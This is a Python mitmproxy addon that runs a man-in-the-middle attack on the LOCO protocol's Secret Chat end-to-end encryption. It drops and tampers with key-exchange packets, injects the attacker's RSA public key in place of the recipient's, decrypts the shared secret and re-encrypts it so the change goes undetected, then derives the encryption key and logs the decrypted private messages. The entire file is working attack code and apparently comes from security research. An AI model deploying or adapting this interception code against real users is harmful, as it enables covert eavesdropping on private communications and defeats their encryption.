import base64
import logging

from lib.crypto_utils import get_rsa_key_pair
from lib.loco_parser import LocoParser
from mitmproxy import connection, tcp, tls
from mitmproxy.utils import human, strutils


class LocoMitmBase:
    def __init__(self, rsa_key_pair, master_secret=None, test_key=None) -> None:
        self.parser = LocoParser()
        self.rsa_key_pair = rsa_key_pair
        self.recipient_user_id = 0
        self.recipient_public_key = b""
        self.shared_secret = b""
        self.master_secret = master_secret
        self.e2e_encryption_key = test_key

    @staticmethod
    def get_addr(server: connection.Server):
        return server.peername or server.address

    def tls_clienthello(self, data: tls.ClientHelloData):
        server_address = self.get_addr(data.context.server)
        logging.info("Skip TLS intercept for %s.", human.format_address(server_address))
        data.ignore_connection = True


class SecretChatMitm(LocoMitmBase):
    def compute_e2e_encryption_key(self, shared_secret):
        if not self.e2e_encryption_key:
            self.e2e_encryption_key = self.parser.get_e2e_encryption_key(shared_secret)
            logging.warning(
                "Shared secret: %s E2E encryption key: %s",
                shared_secret,
                base64.b64encode(self.e2e_encryption_key),
            )

    def tcp_message(self, flow: tcp.TCPFlow):
        message = flow.messages[-1]
        self.parser.parse(message.content)

        # Log LOCO packets to STDOUT
        if self.parser.loco_packet:
            decoded_loco_packet = self.parser.loco_packet.get_packet_as_dict()

            logging.info(
                "from_client=%s, content=%s",
                message.from_client,
                decoded_loco_packet,
            )
        else:
            logging.warning(
                "from_client=%s, raw packet bytes=%s",
                message.from_client,
                strutils.bytes_to_escaped_str(message.content),
            )
            return

        # Drop LOCO packets that can't be decoded
        if not decoded_loco_packet:
            logging.warning(
                "Dropping %s packet as we cannot decode the packet body.",
                self.parser.loco_packet.loco_command,
            )
            message.content = b""
            return

        # If there's already a shared secret stored on the server-side remove it
        if (
            not self.e2e_encryption_key
            and not message.from_client
            and self.parser.loco_packet.loco_command
            in {
                "SCREATE",
                "CHATONROOM",
            }
        ):
            if isinstance(self.parser.loco_packet.body_payload, bytes):
                logging.warning(
                    "Dropping %s packet as we cannot decode the packet body.",
                    self.parser.loco_packet.loco_command,
                )
                message.content = b""
                return

            tampered_packet = self.parser.remove_stored_shared_secret()

            if tampered_packet:
                message.content = tampered_packet
                self.parser.parse(message.content)

        # Drop server-side "SETSK" LOCO packets
        if (
            not self.e2e_encryption_key
            and not message.from_client
            and self.parser.loco_packet.loco_command == "SETSK"
        ):
            logging.warning("Dropping server-side SETSK packet.")
            message.content = b""
            return

        # Get recipient's public key and replace it with our MITM public key
        if (
            not self.e2e_encryption_key
            and not message.from_client
            and self.parser.loco_packet.loco_command
            in {"GETPK", "GETLPK", "SCREATE", "CHATONROOM"}
        ):
            logging.warning(
                "Trying to parse recipient's public key from %s packet...",
                self.parser.loco_packet.loco_command,
            )
            (
                recipient_public_key,
                self.recipient_user_id,
                tampered_packet,
            ) = self.parser.inject_public_key(self.rsa_key_pair)

            if not recipient_public_key:
                logging.error(
                    "Could not parse recipient public key from %s packet.",
                    self.parser.loco_packet.loco_command,
                )
                return
            else:
                self.recipient_public_key = recipient_public_key

            if not self.recipient_user_id:
                logging.error(
                    "Could not parse recipient user ID from %s packet.",
                    self.parser.loco_packet.loco_command,
                )
                return

            if not tampered_packet:
                logging.error(
                    "Could not create a fake %s packet.",
                    self.parser.loco_packet.loco_command,
                )
                return

            logging.warning(
                "Injecting MITM public key into %s packet...",
                self.parser.loco_packet.loco_command,
            )
            message.content = tampered_packet
            # logging.info("Tampered packet: %s", self.parser.loco_packet.get_packet_as_dict())

        # Grab the shared secret from the "SETSK" packet
        if (
            self.recipient_public_key
            and not self.e2e_encryption_key
            and message.from_client
            and self.parser.loco_packet.loco_command == "SETSK"
        ):
            logging.warning(
                "Trying to decrypt shared secret from %s packet...",
                self.parser.loco_packet.loco_command,
            )

            shared_secret = self.parser.get_shared_secret(self.rsa_key_pair)

            if not shared_secret:
                logging.error(
                    "Couldn't decrypt shared secret from %s packet. Dropping it...",
                    self.parser.loco_packet.loco_command,
                )
                message.content = b""
                return

            self.shared_secret = shared_secret
            logging.warning("Shared secret: %s", self.shared_secret)

            # Re-encrypt shared secret with the recipient's original public key
            logging.warning("Trying to re-encrypt shared secret...")

            tampered_packet = self.parser.encrypt_shared_secret(
                self.shared_secret, self.recipient_public_key
            )

            if tampered_packet:
                message.content = tampered_packet
                logging.warning(
                    "Re-encrypted shared secret with recipient's original public key."
                )

        # Compute E2E encryption key
        if not self.e2e_encryption_key and self.shared_secret:
            self.compute_e2e_encryption_key(self.shared_secret)

        if not self.e2e_encryption_key and self.master_secret:
            self.compute_e2e_encryption_key(self.master_secret)

        # Decrypt Secret Chat end-to-end encrypted message
        if self.e2e_encryption_key and (
            (message.from_client and self.parser.loco_packet.loco_command == "SWRITE")
            or (
                not message.from_client
                and self.parser.loco_packet.loco_command == "MSG"
            )
        ):
            logging.warning("Trying to decrypt Secret Chat message...")
            decrypted_e2e_message = ""

            if self.master_secret:
                decrypted_e2e_message = self.parser.get_decrypted_e2e_message(
                    self.e2e_encryption_key, self.master_secret
                )
            elif self.shared_secret:
                decrypted_e2e_message = self.parser.get_decrypted_e2e_message(
                    self.e2e_encryption_key, self.shared_secret
                )

            if decrypted_e2e_message:
                logging.warning(
                    "from_client=%s, Secret Chat message=%s",
                    message.from_client,
                    decrypted_e2e_message,
                )


addons = [SecretChatMitm(rsa_key_pair=get_rsa_key_pair())]
